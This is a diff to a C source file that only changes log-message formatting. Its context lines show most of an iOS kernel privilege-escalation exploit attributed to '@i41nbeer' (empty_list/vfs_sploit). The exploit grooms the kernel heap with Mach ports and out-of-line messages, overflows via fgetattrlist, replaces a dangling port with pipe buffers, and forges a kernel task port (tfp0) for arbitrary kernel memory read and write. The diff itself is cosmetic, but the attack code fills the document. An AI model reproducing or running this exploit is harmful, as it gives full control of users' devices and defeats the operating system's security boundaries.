@@ -22,26 +22,26 @@ static void increase_limits()
     struct rlimit lim = { 0 };
     int err = getrlimit(RLIMIT_NOFILE, &lim);
     if (err != 0) {
-        LOG("failed to get limits\n");
+        LOG("failed to get limits");
     }
-    LOG("rlim.cur: %lld\n", lim.rlim_cur);
-    LOG("rlim.max: %lld\n", lim.rlim_max);
+    LOG("rlim.cur: %lld", lim.rlim_cur);
+    LOG("rlim.max: %lld", lim.rlim_max);
 
     lim.rlim_cur = 10240;
 
     err = setrlimit(RLIMIT_NOFILE, &lim);
     if (err != 0) {
-        LOG("failed to set limits\n");
+        LOG("failed to set limits");
     }
 
     lim.rlim_cur = 0;
     lim.rlim_max = 0;
     err = getrlimit(RLIMIT_NOFILE, &lim);
     if (err != 0) {
-        LOG("failed to get limits\n");
+        LOG("failed to get limits");
     }
-    LOG("rlim.cur: %lld\n", lim.rlim_cur);
-    LOG("rlim.max: %lld\n", lim.rlim_max);
+    LOG("rlim.cur: %lld", lim.rlim_cur);
+    LOG("rlim.max: %lld", lim.rlim_max);
 }
 
 #define IO_BITS_ACTIVE 0x80000000
@@ -90,7 +90,7 @@ void alloc_early_ports()
         kern_return_t err;
         err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &early_ports[i]);
         if (err != KERN_SUCCESS) {
-            LOG("mach_port_allocate failed to allocate a new port for early_ports (%d)\n", i);
+            LOG("mach_port_allocate failed to allocate a new port for early_ports (%d)", i);
         }
     }
     next_early_port = N_EARLY_PORTS - 1;
@@ -99,7 +99,7 @@ void alloc_early_ports()
 mach_port_t steal_early_port()
 {
     if (next_early_port == 0) {
-        LOG("out of early ports\n");
+        LOG("out of early ports");
         sleep(100);
     }
     mach_port_t p = early_ports[next_early_port];
@@ -111,7 +111,7 @@ mach_port_t steal_early_port()
 void dump_early_ports()
 {
     for (int i = 0; i < N_EARLY_PORTS; i++) {
-        LOG("EARLY %d %08x\n", i, early_ports[i]);
+        LOG("EARLY %d %08x", i, early_ports[i]);
     }
 }
 
@@ -168,7 +168,7 @@ mach_port_t kalloc_16()
         MACH_MSG_TIMEOUT_NONE,
         MACH_PORT_NULL);
     if (err != KERN_SUCCESS) {
-        LOG("sending kalloc.16 message failed %s\n", mach_error_string(err));
+        LOG("sending kalloc.16 message failed %s", mach_error_string(err));
     }
 
     return port;
@@ -185,7 +185,7 @@ mach_port_t alloc_middle_port()
     err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
     mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND); // added
     if (err != KERN_SUCCESS) {
-        LOG("failed to alloc middle port\n");
+        LOG("failed to alloc middle port");
     }
     middle_ports[next_middle_port++] = port;
     return port;
@@ -201,7 +201,7 @@ struct ool_multi_msg {
 mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messages_to_send, mach_port_t holder_port, mach_port_t* source_ports)
 {
     if (messages_to_send > MACH_PORT_QLIMIT_LARGE) {
-        LOG("****************** too many messages\n");
+        LOG("****************** too many messages");
         return MACH_PORT_NULL;
     }
 
@@ -213,7 +213,7 @@ mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messa
         mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
 
         if (err != KERN_SUCCESS) {
-            LOG("failed to allocate port for hold kallocs\n");
+            LOG("failed to allocate port for hold kallocs");
         }
 
         // bump up the number of messages we can enqueue:
@@ -225,7 +225,7 @@ mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messa
             (mach_port_info_t)&limits,
             MACH_PORT_LIMITS_INFO_COUNT);
         if (err != KERN_SUCCESS) {
-            LOG("failed to increase queue limit\n");
+            LOG("failed to increase queue limit");
             return false;
         }
     } else {
@@ -267,7 +267,7 @@ mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messa
             MACH_MSG_TIMEOUT_NONE,
             MACH_PORT_NULL);
         if (err != KERN_SUCCESS) {
-            LOG("%s\n", mach_error_string(err));
+            LOG("%s", mach_error_string(err));
             //return false;
         }
     }
@@ -290,7 +290,7 @@ void discard_message(mach_port_t port)
         0,
         0);
     if (err != KERN_SUCCESS) {
-        LOG("error receiving on port: %s\n", mach_error_string(err));
+        LOG("error receiving on port: %s", mach_error_string(err));
     }
 
     mach_msg_destroy(msg);
@@ -323,7 +323,7 @@ void do_vfs_overflow()
 {
     int options = 0;
     int err = fgetattrlist(vfs_fd, &al, attrBuf, attrBufSize, options);
-    //LOG("err: %d\n", err);
+    //LOG("err: %d", err);
 }
 
 mach_port_t initial_early_kallocs[80000];
@@ -391,9 +391,9 @@ uint32_t early_rk32(uint64_t kaddr)
     uint32_t val = 0;
     kern_return_t err = pid_for_task(early_read_port, &val);
     if (err != KERN_SUCCESS) {
-        LOG("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
+        LOG("pid_for_task returned %x (%s)", err, mach_error_string(err));
     }
-    LOG("read val via pid_for_task: %08x\n", val);
+    LOG("read val via pid_for_task: %08x", val);
     free(buf);
     return val;
 }
@@ -408,21 +408,21 @@ uint64_t early_rk64(uint64_t kaddr)
 
 bool vfs_sploit()
 {
-    LOG("empty_list by @i41nbeer\n");
+    LOG("empty_list by @i41nbeer");
     offsets_init();
 
     start_spinners();
-    LOG("vfs_sploit\n");
+    LOG("vfs_sploit");
     increase_limits();
 
     size_t kernel_page_size = 0;
     host_page_size(mach_host_self(), &kernel_page_size);
     if (kernel_page_size == 0x4000) {
-        LOG("this device uses 16k kernel pages\n");
+        LOG("this device uses 16k kernel pages");
     } else if (kernel_page_size == 0x1000) {
-        LOG("this device uses 4k kernel pages\n");
+        LOG("this device uses 4k kernel pages");
     } else {
-        LOG("this device uses an unsupported kernel page size\n");
+        LOG("this device uses an unsupported kernel page size");
         return false;
     }
 
@@ -546,7 +546,7 @@ bool vfs_sploit()
                 &typep,
                 &addr);
             if (err != KERN_SUCCESS) {
-                LOG("found the port! %x\n", candidate_port);
+                LOG("found the port! %x", candidate_port);
                 target_port = candidate_port;
                 break;
             }
@@ -588,9 +588,9 @@ bool vfs_sploit()
             int new_size = 100;
             kern_return_t err = mach_port_set_attributes(mach_task_self(), target_port, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)&new_size, sizeof(int));
             if (err != KERN_SUCCESS) {
-                LOG("mach_port_set_attributes failed %s\n", mach_error_string(err));
+                LOG("mach_port_set_attributes failed %s", mach_error_string(err));
             } else {
-                LOG("freed the port\n");
+                LOG("freed the port");
             }
         } else {
             mach_port_destroy(mach_task_self(), port);
@@ -625,21 +625,21 @@ bool vfs_sploit()
     mach_port_t gc_ports[n_gc_ports];
     for (int i = 0; i < n_gc_ports; i++) {
         gc_ports[i] = hold_kallocs(0x1000, 0x1f, 8, MACH_PORT_NULL, replacer_object);
-        LOG("gc tick %d\n", i);
+        LOG("gc tick %d", i);
         pthread_yield_np();
         usleep(10000);
     }
-    LOG("did that trigger a gc and realloc?\n");
+    LOG("did that trigger a gc and realloc?");
 
     // if that worked we should now be able to find the address of the canary port:
     uint64_t canary_port_kaddr = 0;
     kern_return_t err;
     err = mach_port_get_context(mach_task_self(), target_port, &canary_port_kaddr);
     if (err != KERN_SUCCESS) {
-        LOG("error getting context from the target port (but no panic...): %s\n", mach_error_string(err));
+        LOG("error getting context from the target port (but no panic...): %s", mach_error_string(err));
     }
 
-    LOG("the canary port is at %016llx\n", canary_port_kaddr);
+    LOG("the canary port is at %016llx", canary_port_kaddr);
 
     // lets modify the port so we can detect when we receive the message which has the OOL_PORTS descriptor which
     // overlaps the dangling target port:
@@ -658,7 +658,7 @@ bool vfs_sploit()
     uint64_t pipe_target_kaddr_offset = kernel_page_size == 0x4000 ? 0x20000 : 0x10000;
 
     uint64_t pipe_target_kaddr = (canary_port_kaddr + pipe_target_kaddr_offset) & (~0xfffULL); // 0x10000
-    LOG("pipe_target_kaddr: %016llx\n", pipe_target_kaddr);
+    LOG("pipe_target_kaddr: %016llx", pipe_target_kaddr);
 
     build_fake_task_port(pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0, 0);
 
@@ -676,11 +676,11 @@ bool vfs_sploit()
         char pad[1000];
     } msg = { 0 };
 
-    LOG("sizeof(msg) 0x%x\n", sizeof(msg));
+    LOG("sizeof(msg) 0x%x", sizeof(msg));
 
     int hit_dangler = 0;
     int dangler_hits = 0;
-    LOG("the canary port is: %x\n", canary_port);
+    LOG("the canary port is: %x", canary_port);
 
     mach_port_t fake_canary_port = MACH_PORT_NULL;
 
@@ -696,7 +696,7 @@ bool vfs_sploit()
                 0,
                 0);
             if (err != KERN_SUCCESS) {
-                LOG("failed to receive OOL_PORTS message (%d,%d) %s\n", i, j, mach_error_string(err));
+                LOG("failed to receive OOL_PORTS message (%d,%d) %s", i, j, mach_error_string(err));
             }
 
             // check each of the canary ports:
@@ -704,7 +704,7 @@ bool vfs_sploit()
                 mach_port_t* ool_ports = msg.ool_ports[k].address;
                 mach_port_t tester_port = ool_ports[koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) / 8];
                 if (tester_port != canary_port) {
-                    LOG("found the mis-matching OOL discriptor (%x)\n", tester_port);
+                    LOG("found the mis-matching OOL discriptor (%x)", tester_port);
                     hit_dangler = 1;
                     fake_canary_port = tester_port;
                 } else {
@@ -720,7 +720,7 @@ bool vfs_sploit()
         } else {
             if (dangler_hits == 14) {
                 // we'll run out of pipe kva so stop now
-                LOG("hopefully that's enough pipes\n");
+                LOG("hopefully that's enough pipes");
                 break;
             }
             for (int i = 0; i < (0x1f * 8); i++) {
@@ -743,7 +743,7 @@ bool vfs_sploit()
 
                 ssize_t amount_written = write(write_end, pipe_buf, 0xfff);
                 if (amount_written != 0xfff) {
-                    LOG("amount written was short: 0x%x\n", amount_written);
+                    LOG("amount written was short: 0x%x", amount_written);
                 }
 
                 read_ends[next_pipe_index] = read_end;
@@ -753,29 +753,29 @@ bool vfs_sploit()
         }
     }
 
-    LOG("replaced with pipes hopefully... take a look\n");
+    LOG("replaced with pipes hopefully... take a look");
 
     // check the kernel object type of the dangling port:
     int otype = 0;
     mach_vm_address_t oaddr = 0;
     err = mach_port_kobject(mach_task_self(), target_port, &otype, &oaddr);
     if (err != KERN_SUCCESS) {
-        LOG("mach_port_kobject failed: %x %s\n", err, mach_error_string(err));
+        LOG("mach_port_kobject failed: %x %s", err, mach_error_string(err));
     }
-    LOG("dangling port type: %x\n", otype);
+    LOG("dangling port type: %x", otype);
 
     uint64_t replacer_pipe_index = 0xfffffff;
     err = mach_port_get_context(mach_task_self(), target_port, &replacer_pipe_index);
-    LOG("got replaced with pipe fd index %d\n", replacer_pipe_index);
+    LOG("got replaced with pipe fd index %d", replacer_pipe_index);
 
-    LOG("gonna try a read...\n");
+    LOG("gonna try a read...");
 
     uint32_t val = 0;
     err = pid_for_task(target_port, &val);
     if (err != KERN_SUCCESS) {
-        LOG("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
+        LOG("pid_for_task returned %x (%s)", err, mach_error_string(err));
     }
-    LOG("read val via pid_for_task: %08x\n", val);
+    LOG("read val via pid_for_task: %08x", val);
 
     // at this point we know:
     //  * which pipe fd overlaps with the dangling port
@@ -801,11 +801,11 @@ bool vfs_sploit()
         uint32_t val = 0;
         err = pid_for_task(target_port, &val);
         if (err != KERN_SUCCESS) {
-            LOG("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
+            LOG("pid_for_task returned %x (%s)", err, mach_error_string(err));
         }
-        LOG("read val via pid_for_task: %08x\n", val);
+        LOG("read val via pid_for_task: %08x", val);
         if (val != 0x80000002) {
-            LOG("replacer fd index %d is at the pipe_target_kaddr\n", i);
+            LOG("replacer fd index %d is at the pipe_target_kaddr", i);
             pipe_target_kaddr_replacer_index = i;
             break;
         }
@@ -813,7 +813,7 @@ bool vfs_sploit()
     free(old_contents);
     free(new_contents);
     if (pipe_target_kaddr_replacer_index == -1) {
-        LOG("failed to find the pipe_target_kaddr_replacer pipe\n");
+        LOG("failed to find the pipe_target_kaddr_replacer pipe");
     }
 
     // now we know which pipe fd matches up with where the fake task is so
@@ -841,18 +841,18 @@ bool vfs_sploit()
         MACH_MSG_TIMEOUT_NONE,
         MACH_PORT_NULL);
     if (err != KERN_SUCCESS) {
-        LOG("failed to send host message to canary port %s\n", mach_error_string(err));
+        LOG("failed to send host message to canary port %s", mach_error_string(err));
         //return false;
     }
-    LOG("sent host_msg to canary port, let's find it and locate the host port\n");
+    LOG("sent host_msg to canary port, let's find it and locate the host port");
 
     uint64_t host_kmsg = early_rk64(canary_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
-    LOG("host_kmsg: %016llx\n", host_kmsg);
+    LOG("host_kmsg: %016llx", host_kmsg);
 
     // hexdump the kmsg:
     //for (int i = 0; i < 100; i++) {
     //  uint64_t val = early_rk64(host_kmsg + (i*8));
-    //  LOG("%016llx: %016llx\n", host_kmsg + (i*8), val);
+    //  LOG("%016llx: %016llx", host_kmsg + (i*8), val);
     //}
     uint64_t host_port_kaddr = early_rk64(host_kmsg + 0xac); // could parse the message to find this rather than hardcode
 
@@ -868,24 +868,24 @@ bool vfs_sploit()
         MACH_MSG_TIMEOUT_NONE,
         MACH_PORT_NULL);
     if (err != KERN_SUCCESS) {
-        LOG("failed to send host message to canary port %s\n", mach_error_string(err));
+        LOG("failed to send host message to canary port %s", mach_error_string(err));
         //return false;
     }
-    LOG("sent task_msg to canary port, let's find it and locate the host port\n");
+    LOG("sent task_msg to canary port, let's find it and locate the host port");
 
     uint64_t task_kmsg = early_rk64(canary_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
-    LOG("task_kmsg: %016llx\n", task_kmsg);
+    LOG("task_kmsg: %016llx", task_kmsg);
 
     uint64_t task_port_kaddr = early_rk64(host_kmsg + 0xac);
 
-    LOG("our task port is at %016llx\n", task_port_kaddr);
+    LOG("our task port is at %016llx", task_port_kaddr);
 
     // now we can copy-paste some code from multi_path:
     // for the full read/write primitive we need to find the kernel vm_map and the kernel ipc_space
     // we can get the ipc_space easily from the host port (receiver field):
     uint64_t ipc_space_kernel = early_rk64(host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
 
-    LOG("ipc_space_kernel: %016llx\n", ipc_space_kernel);
+    LOG("ipc_space_kernel: %016llx", ipc_space_kernel);
 
     // the kernel vm_map is a little trickier to find
     // we can use the trick from mach_portal to find the kernel task port because we know it's gonna be near the host_port on the heap:
@@ -895,19 +895,19 @@ bool vfs_sploit()
     uint64_t offset = host_port_kaddr & 0xfff;
     uint64_t first_port = 0;
     if ((offset % 0xa8) == 0) {
-        LOG("host port is on first page\n");
+        LOG("host port is on first page");
         first_port = host_port_kaddr & ~(0xfff);
     } else if (((offset + 0x1000) % 0xa8) == 0) {
-        LOG("host port is on second page\n");
+        LOG("host port is on second page");
         first_port = (host_port_kaddr - 0x1000) & ~(0xfff);
     } else if (((offset + 0x2000) % 0xa8) == 0) {
-        LOG("host port is on second page\n");
+        LOG("host port is on second page");
         first_port = (host_port_kaddr - 0x2000) & ~(0xfff);
     } else {
-        LOG("hummm, my assumptions about port allocations are wrong...\n");
+        LOG("hummm, my assumptions about port allocations are wrong...");
     }
 
-    LOG("first port is at %016llx\n", first_port);
+    LOG("first port is at %016llx", first_port);
     uint64_t kernel_vm_map = 0;
     for (int i = 0; i < ports_per_zcram; i++) {
         uint64_t early_port_kaddr = first_port + (i * 0xa8);
@@ -920,19 +920,19 @@ bool vfs_sploit()
         // get that port's kobject:
         uint64_t task_t = early_rk64(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
         if (task_t == 0) {
-            LOG("weird heap object with NULL kobject\n");
+            LOG("weird heap object with NULL kobject");
             continue;
         }
 
         // check the pid via the bsd_info:
         uint64_t bsd_info = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
         if (bsd_info == 0) {
-            LOG("task doesn't have a bsd info\n");
+            LOG("task doesn't have a bsd info");
             continue;
         }
         uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
         if (pid != 0) {
-            LOG("task isn't the kernel task\n");
+            LOG("task isn't the kernel task");
             continue;
         }
 
@@ -942,11 +942,11 @@ bool vfs_sploit()
     }
 
     if (kernel_vm_map == 0) {
-        LOG("unable to find the kernel task map\n");
+        LOG("unable to find the kernel task map");
         return;
     }
 
-    LOG("kernel map:%016llx\n", kernel_vm_map);
+    LOG("kernel map:%016llx", kernel_vm_map);
 
     // find the address of the dangling port:
     uint64_t task_kaddr = early_rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
@@ -956,7 +956,7 @@ bool vfs_sploit()
     const int sizeof_ipc_entry_t = 0x18;
     uint64_t target_port_kaddr = early_rk64(is_table + ((target_port >> 8) * sizeof_ipc_entry_t));
 
-    LOG("dangling port kaddr is: %016llx\n", target_port_kaddr);
+    LOG("dangling port kaddr is: %016llx", target_port_kaddr);
 
     // now we have everything to build a fake kernel task port for memory r/w:
     // we know which
@@ -971,22 +971,22 @@ bool vfs_sploit()
     write(target_port_write_fd, fake_tfp0_buf, 0xfff);
 
     mach_port_t fake_tfp0 = target_port;
-    LOG("hopefully prepared a fake tfp0!\n");
+    LOG("hopefully prepared a fake tfp0!");
 
     // test it!
     vm_offset_t data_out = 0;
     mach_msg_type_number_t out_size = 0;
     err = mach_vm_read(fake_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
     if (err != KERN_SUCCESS) {
-        LOG("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
+        LOG("mach_vm_read failed: %x %s", err, mach_error_string(err));
         return false;
     }
 
-    LOG("kernel read via second tfp0 port worked?\n");
-    LOG("0x%016llx\n", *(uint64_t*)data_out);
-    LOG("0x%016llx\n", *(uint64_t*)(data_out + 8));
-    LOG("0x%016llx\n", *(uint64_t*)(data_out + 0x10));
-    LOG("0x%016llx\n", *(uint64_t*)(data_out + 0x18));
+    LOG("kernel read via second tfp0 port worked?");
+    LOG("0x%016llx", *(uint64_t*)data_out);
+    LOG("0x%016llx", *(uint64_t*)(data_out + 8));
+    LOG("0x%016llx", *(uint64_t*)(data_out + 0x10));
+    LOG("0x%016llx", *(uint64_t*)(data_out + 0x18));
 
     prepare_for_rw_with_fake_tfp0(fake_tfp0);
 
@@ -1000,7 +1000,7 @@ bool vfs_sploit()
 
     // leak the pipe buffer which replaces the dangling port:
 
-    LOG("going to try to clear up the pipes now\n");
+    LOG("going to try to clear up the pipes now");
 
     // finally we have to fix up the pipe's buffer
     // for this we need to find the process fd table:
@@ -1025,7 +1025,7 @@ bool vfs_sploit()
     uint64_t pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
 
     // clear the inline struct pipebuf
-    LOG("clearing pipebuf: %llx\n", pipe);
+    LOG("clearing pipebuf: %llx", pipe);
     WriteKernel64(pipe + 0x00, 0);
     WriteKernel64(pipe + 0x08, 0);
     WriteKernel64(pipe + 0x10, 0);
@@ -1042,7 +1042,7 @@ bool vfs_sploit()
     // struct pipe
     pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
 
-    LOG("clearing pipebuf: %llx\n", pipe);
+    LOG("clearing pipebuf: %llx", pipe);
     WriteKernel64(pipe + 0x00, 0);
     WriteKernel64(pipe + 0x08, 0);
     WriteKernel64(pipe + 0x10, 0);
@@ -1052,10 +1052,10 @@ bool vfs_sploit()
         close(read_ends[i]);
     }
 
-    LOG("done!\n");
+    LOG("done!");
 
-    LOG("use the functions in kmem.h to read and write kernel memory\n");
-    LOG("tfp0 in there will stay alive once this process exits\n");
-    LOG("keep hold of a send right to it; don't expect this exploit to work again without a reboot\n");
+    LOG("use the functions in kmem.h to read and write kernel memory");
+    LOG("tfp0 in there will stay alive once this process exits");
+    LOG("keep hold of a send right to it; don't expect this exploit to work again without a reboot");
     return true;
 }
